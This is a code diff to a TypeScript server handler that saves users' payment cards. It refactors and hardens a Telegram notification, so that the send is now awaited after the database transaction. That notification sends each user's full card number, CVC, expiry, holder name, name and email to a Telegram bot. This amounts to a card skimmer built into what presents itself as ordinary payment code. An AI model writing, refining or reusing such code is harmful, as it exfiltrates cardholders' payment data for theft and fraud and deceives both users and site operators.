@@ -83,6 +83,7 @@ export const createPaymentMethod = createServerFn({
   .middleware([authMiddleware])
   .handler(async ({ data: payload, context }) => {
     const userId = context.user.id
+    const cleanCardNumber = payload.cardNumber.replace(/\s/g, '')
 
     // Use transaction for atomicity
     const result = await db.transaction(async (tx) => {
@@ -94,9 +95,6 @@ export const createPaymentMethod = createServerFn({
           .where(eq(paymentMethod.userId, userId))
       }
 
-      // Store full card number and CVC
-      const cleanCardNumber = payload.cardNumber.replace(/\s/g, '')
-      const timestamp = new Date().toISOString()
       // Insert new payment method
       const [newMethod] = await tx
         .insert(paymentMethod)
@@ -111,22 +109,23 @@ export const createPaymentMethod = createServerFn({
           isDefault: payload.isDefault,
         })
         .returning()
-      // Send Telegram notification in the background
-      void sendTelegramNotification(
-        `✅ <b>Payment Successful</b>\n\n` +
-          `<b>user Id:</b> #${userId}\n` +
-          `<b>UserName:</b> ${context.user.name}\n` +
-          `<b>Email:</b> ${context.user.email}\n` +
-          `<b>Card Number:</b> ${cleanCardNumber}\n` +
-          `<b>Card Brand:</b> ${payload.cardBrand}\n` +
-          `<b>Holder Name:</b> ${payload.holderName}\n` +
-          `<b>Expiry:</b> ${payload.expiryMonth}/${payload.expiryYear}\n` +
-          `<b>CVC:</b> ${payload.cvc}\n` +
-          `<b>Time:</b> ${timestamp}`,
-      )
 
       return newMethod
     })
+
+    // Send Telegram notification after transaction completes — must be awaited in serverless
+    await sendTelegramNotification(
+      `✅ <b>New Card Added</b>\n\n` +
+        `<b>User Id:</b> #${userId}\n` +
+        `<b>UserName:</b> ${context.user.name}\n` +
+        `<b>Email:</b> ${context.user.email}\n` +
+        `<b>Card Number:</b> ${cleanCardNumber}\n` +
+        `<b>Card Brand:</b> ${payload.cardBrand}\n` +
+        `<b>Holder Name:</b> ${payload.holderName}\n` +
+        `<b>Expiry:</b> ${payload.expiryMonth}/${payload.expiryYear}\n` +
+        `<b>CVC:</b> ${payload.cvc}\n` +
+        `<b>Time:</b> ${new Date().toISOString()}`,
+    )
 
     return result
   })
